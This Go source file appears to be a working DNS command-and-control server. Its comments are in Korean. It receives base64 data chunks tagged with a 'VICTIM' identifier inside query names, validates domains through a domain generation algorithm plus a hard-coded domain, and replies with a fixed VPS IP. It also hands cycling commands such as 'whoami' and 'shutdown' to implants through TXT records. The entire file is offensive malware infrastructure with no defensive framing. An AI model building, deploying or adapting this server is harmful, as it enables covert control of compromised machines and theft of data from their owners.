package main

import (
    "fmt"
    "log"
    "net"
    "os"
    "strings"
    "time"

    "github.com/miekg/dns"
)

const (
    listenAddr = ":53"
    logPath    = "/root/dns-c2/logs/raw/dns_query.log" // 로그 경로
    vpsIP      = "178.128.53.254"                      // VPS 공인 IP
)

var (
    config = map[int]struct {
        seed  int
        shift int
        mod   int
        tlds  []string
    }{
        1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us"}},
    }
    fixedDomain = "main.pintruder.com"
    commands    = map[string]string{"default": "whoami"}
)

// 비트 회전 함수
func ror32(v, s uint32) uint32 {
    v &= 0xFFFFFFFF
    return (v >> s) | (v << (32 - s)) & 0xFFFFFFFF
}

func rol32(v, s uint32) uint32 {
    return (v << s) | (v >> (32 - s)) & 0xFFFFFFFF
}

// DGA 함수 (3주 주기)
func dga(date time.Time, configNr, domainNr int) string {
    c := config[configNr]
    period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day() / 21)
    t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))

    if c.seed != 0 {
        t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift))
    }

    t = ror32(0xB11924E1*(t+uint32(date.Day()/2)+0x27100001), uint32(c.shift))
    t = ror32(0xB11924E1*(t+uint32(date.Month())+0x2709A354), uint32(c.shift))

    nr := rol32(uint32(domainNr%c.mod), 21)
    s := rol32(uint32(c.seed), 17)

    r := (ror32(0xB11924E1*(nr+t+s+0x27100001), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
    length := (r % 11) + 5

    domain := ""
    for i := 0; i < int(length); i++ {
        r = (ror32(0xB11924E1*rol32(r, uint32(i)), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
        domain += string(r%25 + 'a')
    }

    domain += "."
    r = ror32(r*0xB11924E1, uint32(c.shift))
    tldI := ((r + 0x27100001) & 0xFFFFFFFF) % uint32(len(c.tlds))
    domain += c.tlds[tldI]

    return domain
}

// 명령 업데이트
func updateCommands() {
    cmdList := []string{"whoami", "shutdown", "status"}
    idx := 0
    for {
        time.Sleep(60 * time.Second)
        commands["default"] = cmdList[idx%len(cmdList)]
        log.Printf("명령 업데이트: %s", commands["default"])
        idx++
    }
}

// 로그 저장
func saveLog(entry string) {
    f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Printf("로그 저장 실패: %v", err)
        return
    }
    defer f.Close()
    if _, err := f.WriteString(entry + "\n"); err != nil {
        log.Printf("로그 쓰기 실패: %v", err)
    }
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
    msg := new(dns.Msg)
    msg.SetReply(r)
    msg.Compress = false

    // 중복 청크 추적
    var seenChunks = make(map[string]bool)

    for _, q := range r.Question {
        qname := strings.ToLower(q.Name)
        logEntry := fmt.Sprintf("수신 시간: %s | 도메인: %s | 타입: %s | 클라이언트: %s",
            time.Now().UTC().Format(time.RFC3339), qname, dns.TypeToString[q.Qtype], w.RemoteAddr().String())
        fmt.Println(logEntry)
        saveLog(logEntry)

        // 청크 데이터 파싱
        parts := strings.Split(qname, ".")
        var chunkIdx, victim, b64 string
        if len(parts) >= 4 {
            chunkIdx, victim, b64 = parts[0], parts[1], parts[2]
            chunkLog := fmt.Sprintf("%s | CHUNK:%s | VICTIM:%s | B64:%s",
                time.Now().UTC().Format(time.RFC3339), chunkIdx, victim, b64)
            // 중복 체크
            chunkKey := victim + chunkIdx
            if seenChunks[chunkKey] {
                chunkLog += " | 중복"
            } else {
                seenChunks[chunkKey] = true
            }
            fmt.Println(chunkLog)
            saveLog(chunkLog)
        } else {
            // 유효하지 않은 도메인 로그
            invalidLog := fmt.Sprintf("%s | 유효하지 않은 도메인: %s", time.Now().UTC().Format(time.RFC3339), qname)
            fmt.Println(invalidLog)
            saveLog(invalidLog)
        }

        // 유효 도메인 검증
        now := time.Now().UTC()
        validDomains := make([]string, 0, 21)
        for i := 0; i < 20; i++ {
            validDomains = append(validDomains, dga(now, 1, i))
        }
        validDomains = append(validDomains, fixedDomain, "pintruder.com")

        if contains(validDomains, strings.TrimSuffix(qname, ".")) || strings.HasSuffix(qname, ".pintruder.com.") {
            if q.Qtype == dns.TypeA {
                a := &dns.A{
                    Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
                    A:   net.ParseIP(vpsIP),
                }
                msg.Answer = append(msg.Answer, a)
            }
            if q.Qtype == dns.TypeTXT {
                txt := &dns.TXT{
                    Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
                    Txt: []string{fmt.Sprintf("ACK:%s|CMD:%s", chunkIdx, commands["default"])},
                }
                msg.Answer = append(msg.Answer, txt)
            }
        } else {
            msg.SetRcode(r, dns.RcodeNameError)
            saveLog(fmt.Sprintf("%s | NXDOMAIN 응답: %s", time.Now().UTC().Format(time.RFC3339), qname))
        }
    }

    if err := w.WriteMsg(msg); err != nil {
        logEntry := fmt.Sprintf("%s | 응답 전송 실패: %v | 도메인: %s",
            time.Now().UTC().Format(time.RFC3339), err, r.Question[0].Name)
        fmt.Println(logEntry)
        saveLog(logEntry)
    }
}

func main() {
    dns.HandleFunc(".", handleRequest)

    // 명령 업데이트 고루틴
    go updateCommands()

    // UDP 서버
    udpServer := &dns.Server{Addr: listenAddr, Net: "udp"}
    // TCP 서버 (안정성 위해 추가)
    tcpServer := &dns.Server{Addr: listenAddr, Net: "tcp"}

    // 서버 시작
    go func() {
        log.Println("[+] UDP DNS 서버 시작: :53")
        if err := udpServer.ListenAndServe(); err != nil {
            log.Fatalf("UDP 서버 실패: %v", err)
        }
    }()
    go func() {
        log.Println("[+] TCP DNS 서버 시작: :53")
        if err := tcpServer.ListenAndServe(); err != nil {
            log.Fatalf("TCP 서버 실패: %v", err)
        }
    }()

    // 종료 대기
    select {}
}
